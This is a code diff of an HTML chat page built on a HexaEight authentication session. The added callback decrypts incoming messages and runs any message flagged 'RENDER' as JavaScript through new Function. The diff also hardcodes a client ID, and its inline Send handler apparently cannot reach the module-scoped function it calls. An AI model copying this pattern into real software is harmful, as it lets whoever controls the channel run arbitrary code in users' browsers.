@@ -1,80 +1,82 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>HexaEight Authentication</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="chatui.css"> <!-- Assuming you have this CSS file -->
-    <style>
-        /* Your CSS styles here */
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>HexaEight Authentication Example</h1>
-        <h2 id="appname"></h2>
-        <p id="greeting"></p>
-        <div>
-            <div class="mbr-section align-center">
-                <h2><strong>Chat Interface</strong></h2>
-                <div id="userEngagementContainerDIV" class="user-container"></div>
-                <div id="chatContainerDivID" class="chat-container">
-                    <div id="message-container"></div>
-                </div>
-                <textarea id="messageinput" placeholder="Type your message..."></textarea>
-                <div class="button-container">
-                    <button id="talkButton">Talk</button>
-                    <button id="sendButton">Send</button> <!-- Removed the onclick attribute here -->
-                </div>
-                <div class="button-container">
-                    <button id="muteButton">Mute</button>
-                    <button id="speakerButton">Speaker</button>
-                    <select id="languageDropdown"></select>
-                </div>
-            </div>
-        </div>
-    </div>
-    <script src="https://cdn.jsdelivr.net/npm/pouchdb@latest/dist/pouchdb.min.js"></script> <!-- Include PouchDB -->
+    <title>HexaEight Chat Integration</title>
+    <link rel="stylesheet" href="chatui.css">
+    <script src="https://cdn.jsdelivr.net/npm/pouchdb/dist/pouchdb.min.js"></script>
     <script type="module">
         import HexaEight from './hexaeightsession.mjs';
         import { HexaEightChat } from './hexaeightAIchat.mjs';
 
         const session = new HexaEight();
-        const clientid = "FD836DD6C58AD0AC762455B3221408B1FDE1FE04";
-        const tokenserverurl = "https://auth2.hexaeight.com:2083";
-        
-        async function init() {
-            const initialized = await session.init(clientid, tokenserverurl, "userEngagementContainerDIV");
+        const clientid = "FD836DD6C58AD0AC762455B3221408B1FDE1FE04"; // Replace with your actual client ID
+        const tokenserverurl = "https://auth2.hexaeight.com:2083"; // Replace with your actual token server URL
+
+        async function initializeSession() {
+            await session.init(clientid, tokenserverurl, "userEngagementContainerDIV");
+            const initialized = await session.ready();
             console.log("Session is initialized: " + initialized);
+
             HexaEightChat.init({
                 chatContainerId: "chatContainerDivID",
                 session: session,
                 messageCallback: async (request, message) => {
                     try {
                         const req = await session.DecipherMessage(request);
-                        console.log("Received new message:", message);
-                        console.log("Received new request:", request);
+                        if (JSON.parse(req).BODY == "RENDER") {
+                            const codeToExecute = JSON.parse(await session.DecipherMessage(message)).BODY;
+                            const asyncFunction = new Function(`(async () => { ${codeToExecute} })();`);
+                            asyncFunction();
+                        }
                     } catch (error) {
-                        console.error("Error in message callback:", error);
+                        console.error("Error handling message:", error);
                     }
-                }
+                    console.log("Received new message:", message);
+                    console.log("Received new request:", request);
+                },
             });
-            let preferredLanguage = "en-US";
-            HexaEightChat.setPreferredLanguage(preferredLanguage, document.getElementById('languageDropdown'));
 
-            // Add event listener for the send button
-            document.getElementById("sendButton").addEventListener("click", sendMessage);
+            const preferredLanguage = "en-US"; // Set your preferred language
+            const languageDropdown = document.getElementById("languageDropdown");
+            HexaEightChat.setPreferredLanguage(preferredLanguage, languageDropdown);
         }
 
         async function sendMessage() {
-            const messageText = document.getElementById("messageinput").value;
+            const messageInput = document.getElementById("messageInput");
+            const messageText = messageInput.value;
             if (messageText !== "") {
                 await session.EngageAI(messageText);
-                document.getElementById("messageinput").value = ""; // Clear the input after sending
+                messageInput.value = ""; // Clear input after sending
             }
         }
 
-        init();
+        // Initialize session on load
+        window.onload = initializeSession;
     </script>
+</head>
+<body>
+
+<div id="userEngagementContainerDIV" class="user-container"></div>
+
+<div id="chatContainerDivID" class="chat-container">
+    <div id="message-container"></div>
+</div>
+
+<div class="container">
+    <textarea id="messageInput" placeholder="Type your message..."></textarea>
+    <div class="button-container">
+        <button id="talkButton">Talk</button>
+        <button id="sendButton" onclick="sendMessage()">Send Message</button>
+    </div>
+</div>
+
+<div class="button-container">
+    <button id="muteButton">Mute</button>
+    <button id="speakerButton">Speaker</button>
+    <select id="languageDropdown"></select>
+</div>
+
 </body>
 </html>
